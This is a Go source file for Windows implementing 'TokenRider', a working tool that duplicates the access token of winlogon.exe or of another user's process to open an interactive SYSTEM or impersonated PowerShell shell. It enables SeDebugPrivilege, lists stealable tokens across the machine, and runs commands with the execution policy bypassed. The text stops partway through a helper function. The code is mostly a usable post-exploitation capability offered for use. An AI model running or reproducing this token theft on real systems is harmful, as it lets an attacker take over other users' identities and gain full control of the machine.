//go:build windows

package main

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"time"
	"unsafe"

	"github.com/Microsoft/go-winio"
	"golang.org/x/sys/windows"
)

const (
	pipeConnectTimeout = 15 * time.Second
	createNoWindow     = 0x08000000
	logonWithProfile   = 0x00000001

	// Windows process/thread constants
	stillActive                    = 259        // STILL_ACTIVE — GetExitCodeProcess sentinel
	extendedStartupInfoPresent     = 0x00080000 // EXTENDED_STARTUPINFO_PRESENT
	procThreadAttrPseudoConsole    = 0x00020016 // PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE
)

var state struct {
	conn       net.Conn
	currentDir string
}

var targetUser string

func main() {
	flag.Usage = func() {
		fmt.Println("  TokenRider - interactive SYSTEM shell")
		fmt.Println()
		fmt.Println("  Spawns an interactive PowerShell session as NT AUTHORITY\\SYSTEM.")
		fmt.Println("  Uses ConPTY for full terminal support (tab completion, PSReadLine, colors).")
		fmt.Println()
		fmt.Println("  Usage:")
		fmt.Println("    tokenrider.exe                    Interactive SYSTEM shell")
		fmt.Println("    tokenrider.exe -c \"whoami\"       Run single command as SYSTEM")
		fmt.Println("    tokenrider.exe -t ?              List available user tokens")
		fmt.Println("    tokenrider.exe -t DOMAIN\\User    Interactive shell as target user")
		fmt.Println()
		fmt.Println("  Options:")
		fmt.Println("    -c <command>   Run a single command and exit")
		fmt.Println("    -t <user>      Target user token (? to list available)")
	}

	var (
		cmdArg = flag.String("c", "", "single command to run")
		target = flag.String("t", "", "target user token (? to list available)")
		agent  = flag.Bool("agent", false, "")
		pipe   = flag.String("pipe", "", "")
		cols   = flag.Int("cols", 0, "")
		rows   = flag.Int("rows", 0, "")
	)
	flag.Parse()

	targetUser = *target

	if err := ensureElevationOrExplain(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	if targetUser == "?" {
		listAvailableTokens()
		return
	}

	// Block self-impersonation — it hangs the shell because the agent
	// process inherits the same console session and deadlocks.
	if targetUser != "" && isSelfImpersonation(targetUser) {
		fatalf("cannot impersonate yourself — shell would deadlock")
	}

	if *agent {
		if strings.TrimSpace(*pipe) == "" {
			fatalf("--pipe is required in --agent mode")
		}
		if err := runAgent(*pipe, *cols, *rows); err != nil {
			fatalf("agent failed: %v", err)
		}
		return
	}

	if *cmdArg != "" {
		out, err := singleCommand(*cmdArg)
		if err != nil {
			fatalf("%v", err)
		}
		if strings.TrimSpace(out) != "" {
			fmt.Println(out)
		}
		return
	}

	if err := startSystemProxy(); err != nil {
		fatalf("start failed: %v", err)
	}
	defer stopSystemProxy()

	if targetUser != "" {
		fmt.Printf("  TokenRider [%s]\n", targetUser)
	} else {
		fmt.Println("  TokenRider [NT AUTHORITY\\SYSTEM]")
	}

	runInteractiveBridge()
}

// ── Single command mode ──────────────────────────────────────────────────

func singleCommand(command string) (string, error) {
	if err := startSystemProxy(); err != nil {
		return "", err
	}
	defer stopSystemProxy()

	return invokeCommand(command)
}

func invokeCommand(command string) (string, error) {
	trimmed := strings.TrimSpace(command)
	if trimmed == "" {
		return "", nil
	}

	resp, err := sendRequest("exec", trimmed)
	if err != nil {
		return "", err
	}
	if !resp.OK {
		return "", errors.New(resp.Output)
	}
	return resp.Output, nil
}

// ── Broker: start / stop / communicate ──────────────────────────────────

type request struct {
	ID      string `json:"id"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
}

type response struct {
	ID     string `json:"id"`
	OK     bool   `json:"ok"`
	Output string `json:"output"`
}

func startSystemProxy() error {
	pipeName := fmt.Sprintf("TokenRider_%d", time.Now().UnixNano())
	listener, err := winio.ListenPipe(`\\.\pipe\`+pipeName, nil)
	if err != nil {
		return err
	}

	// Detect terminal size for the agent's ConPTY
	outHandle := windows.Handle(os.Stdout.Fd())
	var csbi windows.ConsoleScreenBufferInfo
	cols, rows := 120, 30 // fallback if detection fails
	if windows.GetConsoleScreenBufferInfo(outHandle, &csbi) == nil {
		cols = int(csbi.Window.Right - csbi.Window.Left + 1)
		rows = int(csbi.Window.Bottom - csbi.Window.Top + 1)
	}

	if err := spawnSystemAgent(pipeName, cols, rows); err != nil {
		listener.Close()
		return err
	}

	type acceptResult struct {
		conn net.Conn
		err  error
	}
	ch := make(chan acceptResult, 1)
	go func() {
		conn, err := listener.Accept()
		ch <- acceptResult{conn: conn, err: err}
	}()

	select {
	case res := <-ch:
		listener.Close()
		if res.err != nil {
			return res.err
		}
		state.conn = res.conn
		state.currentDir, _ = os.Getwd()
		return nil
	case <-time.After(pipeConnectTimeout):
		listener.Close()
		return fmt.Errorf("agent did not connect within %s", pipeConnectTimeout)
	}
}

func stopSystemProxy() {
	if state.conn != nil {
		state.conn.Close()
		state.conn = nil
	}
}
func sendRequest(kind, payload string) (*response, error) {
	req := request{
		ID:      fmt.Sprintf("%d", time.Now().UnixNano()),
		Type:    kind,
		Payload: payload,
	}
	blob, err := jsonMarshal(req)
	if err != nil {
		return nil, err
	}
	blob = append(blob, '\n')
	if _, err := state.conn.Write(blob); err != nil {
		return nil, err
	}

	reader := bufio.NewReader(state.conn)
	line, err := reader.ReadString('\n')
	if err != nil {
		return nil, err
	}
	var resp response
	if err := jsonUnmarshal([]byte(strings.TrimSpace(line)), &resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

// ── Broker: interactive terminal bridge ──────────────────────────────────

func runInteractiveBridge() {
	// Send "live" request inline — avoid bufio.Reader which can consume
	// ConPTY output that arrives between the OK response and our switch to raw mode.
	req := request{
		ID:      fmt.Sprintf("%d", time.Now().UnixNano()),
		Type:    "live",
		Payload: "",
	}
	blob, err := jsonMarshal(req)
	if err != nil {
		fatalf("ConPTY setup failed: %v", err)
	}
	blob = append(blob, '\n')
	if _, err := state.conn.Write(blob); err != nil {
		fatalf("ConPTY setup failed: %v", err)
	}

	// Read response with timeout — if agent hangs (e.g. self-impersonation),
	// don't block forever. Closing the connection causes Read to return an error.
	conptyReady := make(chan struct{})
	go func() {
		select {
		case <-time.After(pipeConnectTimeout):
			state.conn.Close()
		case <-conptyReady:
		}
	}()

	var respBuf []byte
	oneByte := make([]byte, 1)
	for {
		_, err := state.conn.Read(oneByte)
		if err != nil {
			fatalf("ConPTY setup failed: %v", err)
		}
		if oneByte[0] == '\n' {
			break
		}
		respBuf = append(respBuf, oneByte[0])
	}
	var resp response
	if err := jsonUnmarshal(respBuf, &resp); err != nil {
		fatalf("ConPTY setup failed: %v", err)
	}
	if !resp.OK {
		fatalf("ConPTY rejected: %s", resp.Output)
	}

	close(conptyReady) // cancel the timeout watchdog

	// Raw terminal bridge: broker stdin/stdout ↔ named pipe ↔ agent ConPTY
	inHandle := windows.Handle(os.Stdin.Fd())
	outHandle := windows.Handle(os.Stdout.Fd())

	var oldInMode, oldOutMode uint32
	windows.GetConsoleMode(inHandle, &oldInMode)
	windows.GetConsoleMode(outHandle, &oldOutMode)

	windows.SetConsoleMode(inHandle, windows.ENABLE_VIRTUAL_TERMINAL_INPUT)
	windows.SetConsoleMode(outHandle, oldOutMode|windows.ENABLE_VIRTUAL_TERMINAL_PROCESSING)

	// Ctrl+C safety net: restores console even if bridge hangs
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt)
	go func() {
		<-sigCh
		windows.SetConsoleMode(inHandle, oldInMode)
		windows.SetConsoleMode(outHandle, oldOutMode)
		os.Exit(0)
	}()

	restore := func() {
		windows.SetConsoleMode(inHandle, oldInMode)
		windows.SetConsoleMode(outHandle, oldOutMode)
	}
	defer restore()

	exit := make(chan struct{}, 1)

	// stdin → pipe
	go func() {
		io.Copy(state.conn, os.Stdin)
		select { case exit <- struct{}{}: default: }
	}()

	// pipe → stdout
	go func() {
		io.Copy(os.Stdout, state.conn)
		select { case exit <- struct{}{}: default: }
	}()

	<-exit
}

// ── Agent (runs as SYSTEM) ──────────────────────────────────────────────

func runAgent(pipeName string, cols, rows int) error {
	ctx, cancel := context.WithTimeout(context.Background(), pipeConnectTimeout)
	defer cancel()

	conn, err := winio.DialPipeContext(ctx, `\\.\pipe\`+pipeName)
	if err != nil {
		return err
	}
	defer conn.Close()

	reader := bufio.NewReader(conn)

	// Wait for the first request — if it's "live", enter ConPTY mode
	line, err := reader.ReadString('\n')
	if err != nil {
		return err
	}

	var req request
	if err := jsonUnmarshal([]byte(strings.TrimSpace(line)), &req); err != nil {
		return err
	}

	if req.Type == "live" {
		return runConPTYBridge(conn, cols, rows, req.ID)
	}

	// Non-live request: handle via JSON command mode (for -c single commands)
	handleJSONRequest(conn, req)
	return runJSONAgent(conn, reader)
}

func runJSONAgent(conn net.Conn, reader *bufio.Reader) error {
	cwd, _ := os.Getwd()
	if cwd == "" {
		cwd = os.Getenv("WINDIR")
	}

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			if errors.Is(err, io.EOF) {
				return nil
			}
			return err
		}

		var req request
		if err := jsonUnmarshal([]byte(strings.TrimSpace(line)), &req); err != nil {
			writeResp(conn, response{ID: req.ID, OK: false, Output: err.Error()})
			continue
		}
		handleRequest(conn, req, &cwd)
	}
}

func handleJSONRequest(conn net.Conn, req request) {
	cwd, _ := os.Getwd()
	if cwd == "" {
		cwd = os.Getenv("WINDIR")
	}
	handleRequest(conn, req, &cwd)
}

func handleRequest(conn net.Conn, req request, cwd *string) {
	switch req.Type {
	case "exit":
		writeResp(conn, response{ID: req.ID, OK: true})
	case "cd":
		target := strings.TrimSpace(strings.Trim(req.Payload, `"`))
		if target == "" {
			writeResp(conn, response{ID: req.ID, OK: false, Output: "empty path"})
			return
		}
		if !filepath.IsAbs(target) {
			target = filepath.Join(*cwd, target)
		}
		if err := os.Chdir(target); err != nil {
			writeResp(conn, response{ID: req.ID, OK: false, Output: err.Error()})
			return
		}
		*cwd, _ = os.Getwd()
		writeResp(conn, response{ID: req.ID, OK: true, Output: *cwd})
	default:
		out, err := execPS(req.Payload, *cwd)
		if err != nil {
			msg := out
			if msg == "" {
				msg = err.Error()
			}
			writeResp(conn, response{ID: req.ID, OK: false, Output: strings.TrimRight(msg, "\r\n")})
			return
		}
		writeResp(conn, response{ID: req.ID, OK: true, Output: strings.TrimRight(out, "\r\n")})
	}
}

func writeResp(conn net.Conn, resp response) {
	blob, _ := jsonMarshal(resp)
	blob = append(blob, '\n')
	conn.Write(blob)
}

// ── ConPTY bridge (in agent process) ─────────────────────────────────────

func runConPTYBridge(conn net.Conn, cols, rows int, reqID string) error {
	// Helper to send error response back to broker before agent exits
	sendErr := func(err error) {
		writeResp(conn, response{ID: reqID, OK: false, Output: err.Error()})
	}

	var inRead, inWrite windows.Handle
	var outRead, outWrite windows.Handle
	if err := windows.CreatePipe(&inRead, &inWrite, nil, 0); err != nil {
		sendErr(err)
		return err
	}
	if err := windows.CreatePipe(&outRead, &outWrite, nil, 0); err != nil {
		windows.CloseHandle(inRead)
		windows.CloseHandle(inWrite)
		sendErr(err)
		return err
	}

	// COORD is passed by value: high word = rows (Y), low word = cols (X)
	coordVal := uintptr(uint32(rows)<<16 | uint32(cols))
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createPseudoConsole := kernel32.NewProc("CreatePseudoConsole")
	closePseudoConsole := kernel32.NewProc("ClosePseudoConsole")

	var pty windows.Handle
	r1, _, _ := createPseudoConsole.Call(
		coordVal,
		uintptr(inRead),
		uintptr(outWrite),
		0,
		uintptr(unsafe.Pointer(&pty)),
	)
	if r1 != 0 {
		windows.CloseHandle(inRead)
		windows.CloseHandle(inWrite)
		windows.CloseHandle(outRead)
		windows.CloseHandle(outWrite)
		err := fmt.Errorf("CreatePseudoConsole: 0x%08X", uint32(r1))
		sendErr(err)
		return err
	}
	// Per Windows docs: ClosePseudoConsole must be called before closing the pipe
	// handles it owns (inRead, outWrite). A single defer closure enforces the order
	// regardless of which return path is taken.
	defer func() {
		closePseudoConsole.Call(uintptr(pty))
		windows.CloseHandle(inRead)
		windows.CloseHandle(outWrite)
	}()

	// STARTUPINFOEX with ConPTY attribute
	type startupInfoEx struct {
		windows.StartupInfo
		AttributeList uintptr
	}
	var si startupInfoEx
	si.StartupInfo.Cb = uint32(unsafe.Sizeof(si))

	initAttr := kernel32.NewProc("InitializeProcThreadAttributeList")
	updateAttr := kernel32.NewProc("UpdateProcThreadAttribute")
	deleteAttr := kernel32.NewProc("DeleteProcThreadAttributeList")

	var attrSize uintptr
	initAttr.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrSize)))
	attrBuf := make([]byte, attrSize)
	si.AttributeList = uintptr(unsafe.Pointer(&attrBuf[0]))
	initAttr.Call(si.AttributeList, 1, 0, uintptr(unsafe.Pointer(&attrSize)))

	r1, _, _ = updateAttr.Call(
		si.AttributeList, 0,
		uintptr(procThreadAttrPseudoConsole),
		uintptr(pty), unsafe.Sizeof(pty), // handle VALUE, not pointer to handle
		0, 0,
	)
	if r1 == 0 {
		err := fmt.Errorf("UpdateProcThreadAttribute failed")
		sendErr(err)
		return err
	}
	defer deleteAttr.Call(si.AttributeList)

	// Launch PowerShell in ConPTY (CreateProcess supports it)
	cmdBuf, _ := windows.UTF16FromString(`powershell.exe`)
	var pi windows.ProcessInformation
	if err := windows.CreateProcess(
		nil, &cmdBuf[0], nil, nil,
		false,
		extendedStartupInfoPresent,
		nil, nil,
		(*windows.StartupInfo)(unsafe.Pointer(&si)),
		&pi,
	); err != nil {
		sendErr(err)
		return err
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// Verify PowerShell didn't exit immediately
	time.Sleep(200 * time.Millisecond)
	var exitCode uint32
	if err := windows.GetExitCodeProcess(pi.Process, &exitCode); err == nil && exitCode != stillActive {
		err := fmt.Errorf("PowerShell exited immediately (code %d)", exitCode)
		sendErr(err)
		return err
	}

	// ConPTY setup succeeded — acknowledge to broker
	writeResp(conn, response{ID: reqID, OK: true})

	// Wrap remaining ConPTY handles as os.File for io.Copy.
	// inRead/outWrite are closed by the ConPTY teardown closure above.
	conptyIn := os.NewFile(uintptr(inWrite), "conpty-in")
	conptyOut := os.NewFile(uintptr(outRead), "conpty-out")
	defer conptyIn.Close()
	defer conptyOut.Close()

	// ConPTY output → named pipe → broker stdout
	go io.Copy(conn, conptyOut)

	// Broker stdin → named pipe → ConPTY input
	go io.Copy(conptyIn, conn)

	// Wait for PowerShell to exit
	windows.WaitForSingleObject(pi.Process, windows.INFINITE)
	return nil
}

// ── Process spawning ─────────────────────────────────────────────────────

func spawnSystemAgent(pipeName string, cols, rows int) error {
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		return fmt.Errorf("enable SeDebugPrivilege: %w", err)
	}

	sessionID, err := currentSessionID()
	if err != nil {
		return err
	}

	var pid uint32
	if targetUser != "" {
		pid, err = findProcessByUser(targetUser)
	} else {
		pid, err = findProcessInSession("winlogon.exe", sessionID)
	}
	if err != nil {
		return err
	}

	proc, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(PID %d): %w", pid, err)
	}
	defer windows.CloseHandle(proc)

	var sysToken windows.Token
	if err := windows.OpenProcessToken(proc, windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY, &sysToken); err != nil {
		// Some tokens (service accounts) deny TOKEN_ASSIGN_PRIMARY;
		// TOKEN_DUPLICATE|TOKEN_QUERY is enough — DuplicateTokenEx only needs DUPLICATE.
		if err := windows.OpenProcessToken(proc, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &sysToken); err != nil {
			return fmt.Errorf("OpenProcessToken(PID %d): %w", pid, err)
		}
	}
	defer sysToken.Close()

	var primary windows.Token
	if err := windows.DuplicateTokenEx(sysToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenPrimary, &primary); err != nil {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer primary.Close()

	exe, _ := os.Executable()
	exe, _ = filepath.Abs(exe)
	appPtr, _ := windows.UTF16PtrFromString(exe)
	cmdPtr, _ := windows.UTF16PtrFromString(fmt.Sprintf(`"%s" --agent --pipe "%s" --cols %d --rows %d`, exe, pipeName, cols, rows))

	launchDir, _ := os.Getwd()
	if launchDir == "" {
		launchDir = os.Getenv("WINDIR")
	}
	cwdPtr, _ := windows.UTF16PtrFromString(launchDir)

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	_ = enablePrivilege("SeImpersonatePrivilege")
	err = createProcessWithToken(primary, appPtr, cmdPtr, cwdPtr, &si, &pi)
	if err != nil {
		_ = enablePrivilege("SeIncreaseQuotaPrivilege")
		_ = enablePrivilege("SeAssignPrimaryTokenPrivilege")
		fallbackErr := windows.CreateProcessAsUser(primary, appPtr, cmdPtr, nil, nil, false, createNoWindow, nil, cwdPtr, &si, &pi)
		if fallbackErr != nil {
			return fmt.Errorf("CreateProcessWithTokenW: %v; CreateProcessAsUser fallback: %w", err, fallbackErr)
		}
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return nil
}

func createProcessWithToken(token windows.Token, appName, cmdLine, cwd *uint16, si *windows.StartupInfo, pi *windows.ProcessInformation) error {
	r1, _, e1 := windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessWithTokenW").Call(
		uintptr(token),
		uintptr(logonWithProfile),
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(createNoWindow),
		0,
		uintptr(unsafe.Pointer(cwd)),
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if r1 == 0 {
		if e1 != nil && e1 != windows.ERROR_SUCCESS {
			return e1
		}
		return windows.GetLastError()
	}
	return nil
}

// ── Token enumeration ────────────────────────────────────────────────────

// tokenUserInfo extracts the account name and SID string from a token.
// All work is done inline so the buffer backing the SID stays alive.
func tokenUserInfo(token windows.Token) (account, sidStr string) {
	var returnedLen uint32
	windows.GetTokenInformation(token, windows.TokenUser, nil, 0, &returnedLen)
	if returnedLen == 0 {
		return "", ""
	}
	buf := make([]byte, returnedLen)
	if err := windows.GetTokenInformation(token, windows.TokenUser, &buf[0], returnedLen, &returnedLen); err != nil {
		return "", ""
	}
	// TOKEN_USER layout: first field is PSID (pointer to SID)
	sid := *(**windows.SID)(unsafe.Pointer(&buf[0]))
	sidStr = sid.String()

	var nameBuf [256]uint16
	var nameLen uint32 = 256
	var domainBuf [256]uint16
	var domainLen uint32 = 256
	var sidType uint32
	if err := windows.LookupAccountSid(nil, sid, &nameBuf[0], &nameLen, &domainBuf[0], &domainLen, &sidType); err != nil {
		runtime.KeepAlive(buf)
		return sidStr, sidStr
	}
	runtime.KeepAlive(buf)

	name := windows.UTF16ToString(nameBuf[:nameLen])
	domain := windows.UTF16ToString(domainBuf[:domainLen])
	if domain != "" {
		return domain + "\\" + name, sidStr
	}
	return name, sidStr
}

type tokenEntry struct {
	account string
	sid     string
	proc    string
	pid     uint32
}

func collectTokenEntry(pid uint32, exeFile [windows.MAX_PATH]uint16) (tokenEntry, bool) {
	// Skip protected processes — their tokens pass DuplicateTokenEx but are
	// unreliable for launching interactive shells (e.g. "Secure System").
	if isProtectedProcess(pid) {
		return tokenEntry{}, false
	}

	proc, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return tokenEntry{}, false
	}
	defer windows.CloseHandle(proc)

	var token windows.Token
	if err := windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &token); err != nil {
		return tokenEntry{}, false
	}
	defer token.Close()

	account, sidStr := tokenUserInfo(token)
	if account == "" {
		return tokenEntry{}, false
	}

	// Verify we can actually steal this token by trying DuplicateTokenEx.
	// Some protected processes allow OpenProcessToken(TOKEN_DUPLICATE) but
	// fail at DuplicateTokenEx — only a real duplication test catches this.
	if !canDuplicateToken(proc) {
		return tokenEntry{}, false
	}

	return tokenEntry{
		account: account,
		sid:     sidStr,
		proc:    windows.UTF16ToString(exeFile[:]),
		pid:     pid,
	}, true
}

func listAvailableTokens() {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		fatalf("snapshot failed: %v", err)
	}
	defer windows.CloseHandle(snap)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		fatalf("process enumeration failed: %v", err)
	}

	selfPID := uint32(os.Getpid())

	// Get our own SID so we can filter ourselves from the listing
	var selfSID string
	if selfProc, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, selfPID); err == nil {
		var selfToken windows.Token
		if err := windows.OpenProcessToken(selfProc, windows.TOKEN_QUERY, &selfToken); err == nil {
			account, sidStr := tokenUserInfo(selfToken)
			selfToken.Close()
			if account != "" {
				selfSID = sidStr
			}
		}
		windows.CloseHandle(selfProc)
	}

	allEntries := make(map[string][]tokenEntry)
	for {
		if pe.ProcessID == selfPID {
			goto next
		}
		if entry, ok := collectTokenEntry(pe.ProcessID, pe.ExeFile); ok {
			// Skip our own user — impersonating yourself hangs the shell
			if selfSID != "" && entry.sid == selfSID {
				goto next
			}
			allEntries[entry.sid] = append(allEntries[entry.sid], entry)
		}

	next:
		pe.Size = uint32(unsafe.Sizeof(pe))
		if err := windows.Process32Next(snap, &pe); err != nil {
			break
		}
	}

	if len(allEntries) == 0 {
		fmt.Println("No accessible tokens found.")
		return
	}

	// For each SID, try candidates until one has a genuinely spawnable token
	users := make([]tokenEntry, 0, len(allEntries))
	for _, entries := range allEntries {
		for _, entry := range entries {
			if isTokenSpawnable(entry.pid) {
				users = append(users, entry)
				break
			}
		}
	}
	sort.Slice(users, func(i, j int) bool {
		return users[i].account < users[j].account
	})

	fmt.Println("Available user tokens:")
	fmt.Println()
	for _, u := range users {
		fmt.Printf("  %-35s  (%s, PID %d)\n", u.account, u.proc, u.pid)
	}
}

func findProcessByUser(target string) (uint32, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	targetLower := strings.ToLower(target)
	selfPID := uint32(os.Getpid())
	var candidates []uint32

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))
	if err := windows.Process32First(snap, &pe); err != nil {
		return 0, err
	}

	for {
		if pe.ProcessID != selfPID && processMatchesUser(pe.ProcessID, targetLower) {
			candidates = append(candidates, pe.ProcessID)
		}
		pe.Size = uint32(unsafe.Sizeof(pe))
		if err := windows.Process32Next(snap, &pe); err != nil {
			if errors.Is(err, windows.ERROR_NO_MORE_FILES) {
				break
			}
			return 0, err
		}
	}

	for _, pid := range candidates {
		if isTokenSpawnable(pid) {
			return pid, nil
		}
	}

	if len(candidates) > 0 {
		return 0, fmt.Errorf("found process(es) running as %q but token is not usable", target)
	}
	return 0, fmt.Errorf("no process found running as %q", target)
}

// canDuplicateToken verifies a process token can actually be stolen by trying
// OpenProcessToken → DuplicateTokenEx. Protected processes (e.g. "Secure System")
// may allow OpenProcessToken with TOKEN_DUPLICATE but fail at DuplicateTokenEx.
func canDuplicateToken(proc windows.Handle) bool {
	var src windows.Token
	if err := windows.OpenProcessToken(proc,
		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &src); err != nil {
		return false
	}
	defer src.Close()

	var dup windows.Token
	if err := windows.DuplicateTokenEx(src, windows.MAXIMUM_ALLOWED, nil,
		windows.SecurityImpersonation, windows.TokenPrimary, &dup); err != nil {
		return false
	}
	dup.Close()
	return true
}

// isProtectedProcess checks if a process is a Windows Protected Process (PP)
// or Protected Process Light (PPL). Protected process tokens may pass
// DuplicateTokenEx and even CreateProcessWithTokenW for simple commands, but
// are unreliable for launching interactive shells.
func isProtectedProcess(pid uint32) bool {
	proc, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(proc)

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQueryInfo := ntdll.NewProc("NtQueryInformationProcess")

	var level byte // PS_PROTECTION.Level
	var returnLen uint32

	status, _, _ := ntQueryInfo.Call(
		uintptr(proc),
		61, // ProcessProtectionInformation
		uintptr(unsafe.Pointer(&level)),
		unsafe.Sizeof(level),
		uintptr(unsafe.Pointer(&returnLen)),
	)

	if status != 0 {
		return false // Can't determine, assume not protected
	}

	// Type is in bits 0-2: 0=None, 1=Protected, 2=ProtectedLight
	return level&0x7 != 0
}

// isTokenSpawnable verifies a process token can actually create a new process.
// This is a stronger check than canDuplicateToken: it attempts the full
// duplicate + spawn chain, filtering out tokens that pass DuplicateTokenEx
// but cannot create processes (e.g. protected process tokens).
func isTokenSpawnable(pid uint32) bool {
	proc, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(proc)

	var sysToken windows.Token
	if err := windows.OpenProcessToken(proc, windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY, &sysToken); err != nil {
		if err := windows.OpenProcessToken(proc, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &sysToken); err != nil {
			return false
		}
	}
	defer sysToken.Close()

	var primary windows.Token
	if err := windows.DuplicateTokenEx(sysToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenPrimary, &primary); err != nil {
		return false
	}
	defer primary.Close()

	cmdPtr, _ := windows.UTF16PtrFromString(`cmd.exe /c exit 0`)
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	_ = enablePrivilege("SeImpersonatePrivilege")
	err = createProcessWithToken(primary, nil, cmdPtr, nil, &si, &pi)
	if err != nil {
		_ = enablePrivilege("SeIncreaseQuotaPrivilege")
		_ = enablePrivilege("SeAssignPrimaryTokenPrivilege")
		err = windows.CreateProcessAsUser(primary, nil, cmdPtr, nil, nil,
			false, createNoWindow, nil, nil, &si, &pi)
		if err != nil {
			return false
		}
	}
	windows.CloseHandle(pi.Thread)
	windows.WaitForSingleObject(pi.Process, 5000)
	windows.CloseHandle(pi.Process)
	return true
}

func processMatchesUser(pid uint32, targetLower string) bool {
	if isProtectedProcess(pid) {
		return false
	}

	proc, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return false
	}
	defer windows.CloseHandle(proc)

	var token windows.Token
	if err := windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &token); err != nil {
		return false
	}

	account, sidStr := tokenUserInfo(token)
	token.Close()

	if account == "" {
		return false
	}

	accountLower := strings.ToLower(account)
	sidLower := strings.ToLower(sidStr)

	return accountLower == targetLower ||
		strings.HasSuffix(accountLower, "\\"+targetLower) ||
		sidLower == targetLower
}

func isSelfImpersonation(target string) bool {
	proc, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(os.Getpid()))
	if err != nil {
		return false
	}
	defer windows.CloseHandle(proc)

	var token windows.Token
	if err := windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &token); err != nil {
		return false
	}
	defer token.Close()

	account, sidStr := tokenUserInfo(token)
	if account == "" {
		return false
	}

	targetLower := strings.ToLower(target)
	accountLower := strings.ToLower(account)
	sidLower := strings.ToLower(sidStr)

	return accountLower == targetLower ||
		strings.HasSuffix(accountLower, "\\"+targetLower) ||
		sidLower == targetLower
}

// ── Helpers ──────────────────────────────────────────────────────────────

func execPS(command, cwd string) (string, error) {
	cmd := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command)
	cmd.Dir = cwd
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ensureElevationOrExplain() error {
	elevated, err := isProcessElevated()
	if err != nil {
		return fmt.Errorf("unable to determine elevation state: %w", err)
	}

	missing := missingPrivileges([]string{"SeDebugPrivilege"})
	if elevated && len(missing) == 0 {
		return nil
	}

	if isExplorerParent() {
		relaunched, relaunchErr := relaunchAsAdministrator()
		if relaunchErr != nil {
			if len(missing) > 0 {
				return fmt.Errorf("missing required privilege(s): %s. Run as Administrator. Elevation attempt failed: %w", strings.Join(missing, ", "), relaunchErr)
			}
			return fmt.Errorf("process is not elevated. Run as Administrator. Elevation attempt failed: %w", relaunchErr)
		}
		if relaunched {
			os.Exit(0)
		}
	}

	if len(missing) > 0 {
		return fmt.Errorf("missing required privilege(s): %s. Run as Administrator", strings.Join(missing, ", "))
	}
	return fmt.Errorf("process is not elevated. Run as Administrator")
}

func isProcessElevated() (bool, error) {
	token := windows.Token(0)
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err != nil {
		return false, err
	}
	defer token.Close()

	var elevation uint32
	var outLen uint32
	if err := windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &outLen); err != nil {
		return false, err
	}
	return elevation != 0, nil
}

func missingPrivileges(names []string) []string {
	missing := make([]string, 0)
	for _, name := range names {
		if err := enablePrivilege(name); err != nil {
			missing = append(missing, name)
		}
	}
	return missing
}

func isExplorerParent() bool {
	ppid, err := parentProcessID(uint32(os.Getpid()))
	if err != nil {
		return false
	}
	name, err := processNameByPID(ppid)
	if err != nil {
		return false
	}
	return strings.EqualFold(name, "explorer.exe")
}

func parentProcessID(pid uint32) (uint32, error) {
